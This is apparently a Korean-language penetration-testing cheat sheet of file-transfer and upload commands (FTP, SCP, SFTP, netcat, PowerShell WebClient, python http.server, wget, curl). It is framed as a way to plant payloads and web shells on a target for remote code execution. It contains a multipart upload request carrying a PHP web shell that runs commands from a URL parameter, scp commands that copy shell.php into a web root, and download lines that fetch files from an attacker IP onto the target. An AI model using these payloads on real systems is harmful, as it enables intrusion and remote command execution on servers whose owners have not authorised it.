# file upload

- FTP·SCP·SFTP·NC·PowerShell WebClient·python http.server·curl -F로 파일을 업로드/전송하는 명령어와 웹셸 업로드용 multipart 요청 형태 모음
- 페이로드·웹셸을 대상에 올려 RCE를 노리거나, 확보한 크리덴셜로 대상과 공격자 PC 사이에 파일을 옮길 때
- FTP/SCP/SFTP는 유효한 계정과 포트 접근이 필요하고, NC 전송은 양쪽 모두 nc가 설치되어 있어야 한다. 웹셸 업로드는 대상 엔드포인트가 PHP 파일 수용과 실행을 허용해야 한다

## 파일 업로드 명령어 예시

### 로컬에서 원격으로 파일 전송하기

FTP 업로드

```bash
ftp> put 파일명                      # 현재 디렉토리 파일 업로드
ftp> put /경로/파일명                # 특정 경로의 파일 업로드
```

SCP 업로드

```bash
scp 파일명 사용자@원격IP:/목적지/경로   # 기본 형식
scp shell.php admin@10.10.10.10:/var/www/html/  # 실제 예시
scp -P 2222 shell.php user@10.10.10.10:/tmp/    # 포트 지정
```

SFTP 업로드

```bash
sftp 사용자@원격IP
sftp> put 파일명 목적지경로          # 특정 경로에 업로드
sftp> put shell.php /var/www/html/   # 실제 예시
```

NC 사용

```bash
# 수신측(타겟)
nc -lvp 1234 > 받을파일명

# 전송측(공격자)
nc 타겟IP 1234 < 보낼파일명
```

웹쉘/파일 업로더 사용 시

```
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="uploadfile"; filename="shell.php"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundary--
```

PowerShell 다운로드(윈도우 타겟)

```powershell
# 원격에서 파일 가져오기
(New-Object System.Net.WebClient).DownloadFile("http://공격자IP/파일명", "C:\저장경로\파일명")
```

Python 업로드 서버

```bash
# 공격자 측에서 업로드용 서버 실행
python3 -m http.server 8000

# 타겟에서 파일 다운로드
wget http://공격자IP:8000/파일명
curl -O http://공격자IP:8000/파일명
```

curl 사용

```bash
curl -F "file=@/경로/파일명" http://타겟IP/upload.php
```

`@`는 curl에서 파일 업로드할 때 로컬 파일임을 나타내는 표시입니다. `-F` 옵션과 함께 사용합니다.
